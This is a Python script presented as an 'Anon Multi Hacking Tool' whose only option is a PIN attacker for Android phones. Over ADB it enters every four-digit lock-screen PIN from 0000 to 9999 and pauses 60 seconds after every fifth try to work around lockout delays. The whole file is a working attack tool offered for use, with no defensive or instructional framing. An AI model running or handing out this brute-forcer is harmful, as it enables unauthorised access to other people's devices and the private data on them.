import os
import time
import pyautogui
import sys

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def countdown(seconds):
    for i in range(seconds, 0, -1):
        sys.stdout.write(f"\rWaiting: {i} sec")
        sys.stdout.flush()
        time.sleep(1)
    sys.stdout.write("\r")  # Clear the line after countdown
    sys.stdout.flush()

def get_connected_device():
    while True:
        devices_output = os.popen("adb devices").read()
        devices = [line.split()[0] for line in devices_output.splitlines() if 'device' in line and 'List' not in line]
        if len(devices) == 0:
            print("No devices connected. Please connect a device and press ENTER to retry.")
            input("")
        elif len(devices) > 1:
            print("Multiple devices connected. Please connect only one device and press ENTER to retry.")
            input("")
        else:
            return devices[0]

def brute_force_pin():
    clear_screen()
    print("""
                                _____ _                  _   _             _             
     /\                        |  __ (_)            /\  | | | |           | |            
    /  \   _ __   ___  _ __    | |__) | _ __       /  \ | |_| |_ __ _  ___| | _____ _ __ 
   / /\ \ | '_ \ / _ \| '_ \   |  ___/ | '_ \     / /\ \| __| __/ _` |/ __| |/ / _ \ '__|
  / ____ \| | | | (_) | | | |  | |   | | | | |   / ____ \ |_| || (_| | (__|   <  __/ |   
 /_/    \_\_| |_|\___/|_| |_|  |_|   |_|_| |_|  /_/    \_\__|\__\__,_|\___|_|\_\___|_|   
                                                                                         
                                                                                         
""")
    print("Start: press ENTER TWICE")
    print("Stop: Press CTRL+C")
    input("")

    device_id = get_connected_device()

    # Define the range of PIN codes to try
    attempt_count = 0
    for pin in range(10000):  # 0000 - 9999
        pin_str = f"{pin:04d}"  # Ensure the PIN is 4 digits
        attempt_count += 1

        # Print the PIN trying message
        print(f"Trying PIN: {pin_str}")

        # Use adb to input the PIN, adding a delay between each digit
        for digit in pin_str:
            os.system(f"adb -s {device_id} shell input text {digit}")
            time.sleep(0.25)  # Delay between each digit entry

        os.system(f"adb -s {device_id} shell input keyevent 66")  # Press enter

        # Determine the wait time
        if attempt_count % 5 == 0:  # Every 5 attempts, add a longer delay
            wait_time = 60
        else:
            wait_time = 2

        # Countdown and wait
        countdown(wait_time)

def main_menu():
    print("""
                               __  __       _ _   _   _    _            _    _               _______          _ 
     /\                       |  \/  |     | | | (_) | |  | |          | |  (_)             |__   __|        | |
    /  \   _ __   ___  _ __   | \  / |_   _| | |_ _  | |__| | __ _  ___| | ___ _ __   __ _     | | ___   ___ | |
   / /\ \ | '_ \ / _ \| '_ \  | |\/| | | | | | __| | |  __  |/ _` |/ __| |/ / | '_ \ / _` |    | |/ _ \ / _ \| |
  / ____ \| | | | (_) | | | | | |  | | |_| | | |_| | | |  | | (_| | (__|   <| | | | | (_| |    | | (_) | (_) | |
 /_/    \_\_| |_|\___/|_| |_| |_|  |_|\__,_|_|\__|_| |_|  |_|\__,_|\___|_|\_\_|_| |_|\__, |    |_|\___/ \___/|_|
                                                                                      __/ |                     
                                                                                     |___/                      
                                                                                                                                                                         
""")
    print("Options:")
    print("1. Anon Pin Attacker")
    print("-" * 50)
    choice = input("\nSelect an option: ")

    if choice == '1':
        clear_screen()
        brute_force_pin()
    else:
        print("Invalid option. Exiting...")

if __name__ == "__main__":
    main_menu()
